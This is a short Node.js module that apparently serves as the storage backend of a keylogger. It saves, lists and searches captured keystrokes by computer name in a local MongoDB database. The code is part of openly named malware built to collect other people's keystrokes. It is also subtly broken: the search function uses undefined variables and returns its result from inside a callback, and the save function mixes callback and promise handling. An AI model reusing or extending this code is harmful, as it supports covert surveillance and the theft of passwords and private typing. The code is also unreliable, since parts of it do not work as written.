const mongoDB = require("mongodb").MongoClient;
let keyLoggerDB;
const keyLoggerRepo = {
  connectDB: () => {
    mongoDB.connect("mongodb://localhost:27017/", (error, db) => {
      if (error) {
        keyLoggerDB = false;
      } else if (db) {
        keyLoggerDB = db.db("admin");
      } else {
        keyLoggerDB = false;
      }
    });
  },
  saveStrokes: (name, strokes) => {
    const newStrokes = {
      computerName: name,
      keystrokes: strokes
    };
    keyLoggerDB.collection("Keystrokes"
    ).insertOne(newStrokes, (error, res) => {
      if (error) {
        throw new Error(error);
      } 
      if(!res){
        throw new Error("No response from database")
      }
    }).catch(e => {
      throw new Error("Problem saving keystrokes to the database.")
    });
  }
  ,
  retrieveKeyStrokes: () => {
    return keyLoggerDB
      .collection("Keystrokes")
      .find()
      .toArray()
      .then(items => {
        return items
      })
      .catch(e => {
        console.log(e);
      });
  }
  ,
  searchKeyStrokesByName: name => {
    keyLoggerDB
      .collection("Keystrokes")
      .find({ computerName: name })
      .toArray((error, result) => {
        db.close();
        if (err) {
          return false;
        } else if (result) {
          return result;
        } else {
          return false;
        }
      });
  }
};

module.exports = keyLoggerRepo;
